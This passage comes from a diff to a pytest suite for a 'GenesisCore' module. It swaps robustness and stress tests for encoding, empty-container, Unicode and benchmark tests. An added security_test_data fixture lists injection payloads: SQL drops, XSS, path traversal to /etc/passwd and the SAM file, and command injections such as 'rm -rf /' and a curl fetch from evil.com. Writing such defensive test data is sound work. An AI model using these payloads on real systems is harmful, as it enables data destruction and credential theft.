-            -sys.maxsize - 1,  # Minimum integer
-            2**31 - 1,  # 32-bit max
-            -2**31,  # 32-bit min
-            2**63 - 1,  # 64-bit max
-            -2**63,  # 64-bit min
+        # Test maximum recursion depth
+        max_depth = sys.getrecursionlimit()
+        deep_structure = {"level": 0}
+        current = deep_structure
+        
+        # Create deeply nested structure (but not too deep to cause stack overflow)
+        for i in range(min(100, max_depth // 10)):
+            current["next"] = {"level": i + 1}
+            current = current["next"]
+        
+        result = self.core.process_data(deep_structure)
+        assert result is not None
+    
+    def test_edge_case_character_encoding(self):
+        """Test various character encoding edge cases."""
+        encoding_cases = [
+            b'\xff\xfe\x00\x00',  # UTF-32 BOM
+            b'\xff\xfe',  # UTF-16 BOM
+            b'\xef\xbb\xbf',  # UTF-8 BOM
+            "hello world".encode('utf-8'),  # UTF-8 bytes
+            "hello world".encode('utf-16'),  # UTF-16 bytes
+            "hello world".encode('ascii'),  # ASCII bytes
         ]
         
-        for boundary_num in boundary_numbers:
-            result = self.core.process_data(boundary_num)
+        for case in encoding_cases:
+            result = self.core.process_data(case)
             assert result is not None
     
-    def test_unicode_edge_cases(self):
-        """Test Unicode edge cases."""
-        unicode_edge_cases = [
-            "\u0000",  # Null character
-            "\u0001",  # Start of heading
-            "\u001f",  # Unit separator
-            "\u007f",  # Delete
-            "\u0080",  # First extended ASCII
-            "\u00ff",  # Last extended ASCII
-            "\ud800",  # High surrogate
-            "\udfff",  # Low surrogate
-            "\ufffe",  # Noncharacter
-            "\uffff",  # Noncharacter
+    def test_edge_case_empty_containers(self):
+        """Test handling of various empty containers."""
+        empty_cases = [
+            {},  # Empty dict
+            [],  # Empty list
+            set(),  # Empty set
+            tuple(),  # Empty tuple
+            frozenset(),  # Empty frozenset
+            "",  # Empty string
+            b"",  # Empty bytes
         ]
         
-        for unicode_case in unicode_edge_cases:
-            try:
-                result = self.core.process_data(unicode_case)
-                assert result is not None
-            except UnicodeError:
-                # Acceptable for problematic Unicode
-                pass
-    
-    def test_extremely_nested_structures(self):
-        """Test extremely nested data structures."""
-        # Create deeply nested dict
-        nested_dict = {}
-        current = nested_dict
-        for i in range(500):  # Very deep nesting
-            current[f"level_{i}"] = {}
-            current = current[f"level_{i}"]
-        
-        # Should handle without stack overflow
-        result = self.core.process_data(nested_dict)
-        assert result is not None
-    
-    def test_mixed_data_types(self):
-        """Test with mixed data types in collections."""
-        mixed_data = {
-            "string": "text",
-            "integer": 42,
-            "float": 3.14,
-            "boolean": True,
-            "none": None,
-            "list": [1, "two", 3.0, True, None],
-            "dict": {"nested": "value"},
-            "tuple": (1, 2, 3),
-            "set": {1, 2, 3},
-        }
-        
-        result = self.core.process_data(mixed_data)
-        assert result is not None
-        assert isinstance(result, dict)
+        for case in empty_cases:
+            result = self.core.process_data(case)
+            # Should handle empty containers gracefully
+            assert result is not None or result == case
 
 
-class TestGenesisCoreRobustness:
-    """Robustness testing for various system conditions."""
-    
-    def setup_method(self):
-        self.core = GenesisCore()
-    
-    def test_system_resource_exhaustion(self):
-        """Test behavior under resource exhaustion conditions."""
-        # Simulate low memory conditions
-        with patch('psutil.virtual_memory') as mock_memory:
-            mock_memory.return_value.percent = 95  # 95% memory usage
-            
-            result = self.core.process_data("test_data")
-            assert result is not None
-    
-    def test_network_instability(self):
-        """Test behavior under unstable network conditions."""
-        with patch('requests.get') as mock_get:
-            # Simulate intermittent network issues
-            mock_get.side_effect = [
-                ConnectionError("Network unstable"),
-                Timeout("Intermittent timeout"),
-                Mock(status_code=200, json=lambda: {"success": True})
-            ]
-            
-            result = self.core.make_request("https://api.example.com")
-            assert result is not None
-    
-    def test_disk_space_exhaustion(self):
-        """Test behavior when disk space is exhausted."""
-        with patch('builtins.open', mock_open()) as mock_file:
-            mock_file.side_effect = OSError("No space left on device")
-            
-            try:
-                result = self.core.process_data("file_operation")
-                assert result is not None
-            except OSError:
-                # Acceptable if disk space errors are handled appropriately
-                pass
-    
-    def test_concurrent_modification(self):
-        """Test thread safety under concurrent modifications."""
-        import threading
-        
-        shared_data = {"counter": 0}
-        results = []
-        
-        def worker_thread():
-            for _ in range(100):
-                result = self.core.process_data(shared_data)
-                results.append(result)
-        
-        threads = []
-        for _ in range(5):
-            thread = threading.Thread(target=worker_thread)
-            threads.append(thread)
-            thread.start()
-        
-        for thread in threads:
-            thread.join()
-        
-        assert len(results) == 500
-        assert all(result is not None for result in results)
-    
-    def test_signal_handling(self):
-        """Test behavior when system signals are received."""
-        import signal
-        import os
-        
-        # This test simulates signal handling
-        def signal_handler(signum, frame):
-            pass
-        
-        original_handler = signal.signal(signal.SIGTERM, signal_handler)
-        
-        try:
-            # Send signal to self
-            os.kill(os.getpid(), signal.SIGTERM)
-            
-            # System should continue functioning
-            result = self.core.process_data("test_after_signal")
-            assert result is not None
-        finally:
-            signal.signal(signal.SIGTERM, original_handler)
-    
-    def test_garbage_collection_stress(self):
-        """Test behavior under aggressive garbage collection."""
-        import gc
-        
-        # Disable automatic garbage collection
-        gc.disable()
-        
-        try:
-            # Create many objects
-            for i in range(1000):
-                self.core.process_data(f"gc_test_{i}")
-                
-                # Force garbage collection periodically
-                if i % 100 == 0:
-                    gc.collect()
-            
-            # Final garbage collection
-            gc.collect()
-            
-            # System should still function
-            result = self.core.process_data("final_test")
-            assert result is not None
-        finally:
-            gc.enable()
-
-
-# Additional parametrized tests for comprehensive coverage
-@pytest.mark.parametrize("data_type,test_value", [
-    ("string", "test_string"),
-    ("integer", 42),
-    ("float", 3.14159),
-    ("boolean", True),
-    ("none", None),
-    ("list", [1, 2, 3]),
-    ("dict", {"key": "value"}),
-    ("tuple", (1, 2, 3)),
-    ("set", {1, 2, 3}),
-    ("bytes", b"test_bytes"),
-])
-def test_comprehensive_data_types(data_type, test_value):
-    """Comprehensive test for all data types."""
-    core = GenesisCore()
-    
-    try:
-        result = core.process_data(test_value)
-        assert result is not None
-    except Exception as e:
-        # Log the exception for debugging
-        print(f"Error processing {data_type}: {e}")
-        # Re-raise if it's an unexpected error
-        if not isinstance(e, (TypeError, ValueError, AttributeError)):
-            raise
-
-
-@pytest.mark.parametrize("error_type,error_message", [
-    (ValueError, "Invalid value"),
-    (TypeError, "Wrong type"),
-    (AttributeError, "Missing attribute"),
-    (KeyError, "Missing key"),
-    (IndexError, "Index out of range"),
-    (ConnectionError, "Network error"),
-    (Timeout, "Request timeout"),
-    (HTTPError, "HTTP error"),
-])
-def test_comprehensive_error_handling(error_type, error_message):
-    """Comprehensive error handling test."""
-    core = GenesisCore()
-    
-    with patch.object(core, 'make_request') as mock_method:
-        mock_method.side_effect = error_type(error_message)
-        
-        try:
-            result = core.make_request("https://api.example.com")
-            # Should handle errors gracefully
-            assert result is not None or result is None
-        except error_type:
-            # Acceptable if specific errors are re-raised
-            pass
-
-
-# Stress tests
-@pytest.mark.stress
-def test_high_volume_stress():
-    """High volume stress test."""
-    core = GenesisCore()
-    
-    # Process large volume of data
-    for i in range(10000):
-        result = core.process_data(f"stress_test_{i}")
-        assert result is not None
-        
-        # Check every 1000 iterations
-        if i % 1000 == 0:
-            print(f"Processed {i} items")
-
-
-@pytest.mark.stress
-def test_memory_stress():
-    """Memory stress test."""
-    core = GenesisCore()
-    
-    # Create memory-intensive data
-    large_data = []
-    for i in range(1000):
-        large_item = {
-            "id": i,
-            "data": "x" * 1000,
-            "nested": {"deep": ["item"] * 100}
-        }
-        large_data.append(large_item)
-    
-    result = core.process_data(large_data)
-    assert result is not None
-
-
-# Final test to ensure all components work together
-def test_comprehensive_integration():
-    """Comprehensive integration test combining all aspects."""
-    core = GenesisCore()
-    
-    # Test initialization
-    assert core.initialized is True
-    
-    # Test data processing
-    test_data = {
-        "strings": ["hello", "world"],
-        "numbers": [1, 2, 3, 4, 5],
-        "nested": {
-            "level1": {
-                "level2": "deep_value"
+# Enhanced fixtures for advanced testing
+@pytest.fixture
+def advanced_mock_config():
+    """Advanced mock configuration with comprehensive settings."""
+    return {
+        'api': {
+            'primary_key': 'test_primary_key',
+            'secondary_key': 'test_secondary_key',
+            'base_url': 'https://api.test.com',
+            'timeout': 30,
+            'retries': 3,
+            'retry_delay': 1.0,
+            'backoff_factor': 2.0
+        },
+        'cache': {
+            'enabled': True,
+            'ttl': 3600,
+            'max_size': 1000,
+            'eviction_policy': 'lru'
+        },
+        'logging': {
+            'level': 'INFO',
+            'format': '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+            'file': 'genesis_core.log'
+        },
+        'security': {
+            'input_validation': True,
+            'output_sanitization': True,
+            'rate_limiting': {
+                'enabled': True,
+                'requests_per_minute': 60
             }
         },
-        "mixed": [1, "two", 3.0, True, None]
+        'performance': {
+            'max_concurrent_requests': 10,
+            'request_timeout': 30,
+            'connection_pool_size': 20
+        }
     }
+
+
+@pytest.fixture
+def performance_monitor():
+    """Fixture to monitor performance metrics during tests."""
+    import psutil
+    import os
     
-    # Test validation
-    validation_result = core.validate_input(test_data)
-    assert validation_result is True
+    process = psutil.Process(os.getpid())
     
-    # Test processing
-    processing_result = core.process_data(test_data)
-    assert processing_result is not None
-    
-    # Test caching
-    cache_result = core.cache_set("test_key", processing_result)
-    assert cache_result is True
-    
-    # Test network simulation
-    with patch('requests.get') as mock_get:
-        mock_get.return_value.status_code = 200
-        mock_get.return_value.json.return_value = {"success": True}
+    class PerformanceMonitor:
+        def __init__(self):
+            self.initial_memory = process.memory_info().rss
+            self.initial_cpu = process.cpu_percent()
+            self.start_time = time.time()
         
-        network_result = core.make_request("https://api.example.com")
-        assert network_result is not None
+        def get_memory_usage(self):
+            return process.memory_info().rss - self.initial_memory
+        
+        def get_cpu_usage(self):
+            return process.cpu_percent()
+        
+        def get_execution_time(self):
+            return time.time() - self.start_time
+    
+    return PerformanceMonitor()
+
+
+@pytest.fixture
+def security_test_data():
+    """Comprehensive security test data."""
+    return {
+        'sql_injection': [
+            "'; DROP TABLE users; --",
+            "' OR '1'='1",
+            "1; DELETE FROM users",
+            "admin'--",
+            "' UNION SELECT * FROM users--"
+        ],
+        'xss_attacks': [
+            "<script>alert('xss')</script>",
+            "<img src=x onerror=alert('xss')>",
+            "javascript:alert('xss')",
+            "<iframe src=javascript:alert('xss')></iframe>",
+            "<svg onload=alert('xss')>"
+        ],
+        'command_injection': [
+            "; rm -rf /",
+            "| cat /etc/passwd",
+            "& del /f /q c:\\",
+            "$(curl -s http://evil.com/payload.txt)",
+            "`id`"
+        ],
+        'path_traversal': [
+            "../../../etc/passwd",
+            "..\\..\\..\\windows\\system32\\config\\sam",
+            "....//....//....//etc/passwd",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        ]
+    }
+
+
+# Additional parameterized tests
+@pytest.mark.parametrize("data_type,test_value", [
+    (int, 42),
+    (float, 3.14),
+    (str, "test_string"),
+    (list, [1, 2, 3]),
+    (dict, {"key": "value"}),
+    (tuple, (1, 2, 3)),
+    (set, {1, 2, 3}),
+    (bool, True),
+    (type(None), None),
+    (bytes, b"test_bytes"),
+])
+def test_parameterized_data_types(data_type, test_value):
+    """Test processing of various data types."""
+    core = GenesisCore()
+    result = core.process_data(test_value)
+    assert result is not None or result == test_value
+
+
+@pytest.mark.parametrize("unicode_category", [
+    "测试数据",  # Chinese
+    "данные тест",  # Russian
+    "بيانات الاختبار",  # Arabic
+    "テストデータ",  # Japanese
+    "🚀💻🔬🧪",  # Emojis
+    "Iñtërnâtiônàlizætiøn",  # Mixed diacritics
+])
+def test_parameterized_unicode_handling(unicode_category):
+    """Test handling of various Unicode categories."""
+    core = GenesisCore()
+    result = core.process_data(unicode_category)
+    assert result is not None
+    # Should preserve Unicode content
+    assert any(char in str(result) for char in unicode_category)
+
+
+# Performance benchmark tests
+@pytest.mark.benchmark
+def test_benchmark_data_processing():
+    """Benchmark data processing performance."""
+    core = GenesisCore()
+    test_data = {"key": "value" * 1000}
+    
+    # Warmup
+    for _ in range(10):
+        core.process_data(test_data)
+    
+    # Benchmark
+    start_time = time.time()
+    for _ in range(1000):
+        core.process_data(test_data)
+    end_time = time.time()
+    
+    execution_time = end_time - start_time
+    operations_per_second = 1000 / execution_time
+    
+    assert operations_per_second > 500  # Should handle at least 500 ops/second
+    assert execution_time < 2.0  # Should complete within 2 seconds
+
+
+@pytest.mark.benchmark
+def test_benchmark_concurrent_processing():
+    """Benchmark concurrent processing performance."""
+    core = GenesisCore()
+    
+    def worker(worker_id):
+        results = []
+        for i in range(100):
+            result = core.process_data(f"worker_{worker_id}_item_{i}")
+            results.append(result)
+        return results
+    
+    start_time = time.time()
+    
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        futures = [executor.submit(worker, i) for i in range(10)]
+        all_results = [f.result() for f in futures]
+    
+    end_time = time.time()
+    execution_time = end_time - start_time
+    
+    total_operations = 10 * 100  # 10 workers * 100 operations each
+    operations_per_second = total_operations / execution_time
+    
+    assert operations_per_second > 200  # Should handle at least 200 ops/second concurrently
+    assert execution_time < 10.0  # Should complete within 10 seconds
+    assert len(all_results) == 10
+    assert all(len(results) == 100 for results in all_results)
+
+
+if __name__ == "__main__":
+    # Run with additional test markers and options
+    pytest.main([
+        __file__,
+        "-v",  # Verbose output
+        "--tb=short",  # Short traceback format
+        "-x",  # Stop on first failure
+        "--durations=10",  # Show 10 slowest tests
+        "--strict-markers",  # Strict marker validation
+        "-m", "not slow",  # Skip slow tests by default
+        "--cov=app.ai_backend.genesis_core",  # Coverage for genesis_core module
+        "--cov-report=html",  # HTML coverage report
+        "--cov-report=term-missing",  # Terminal coverage report
+    ])
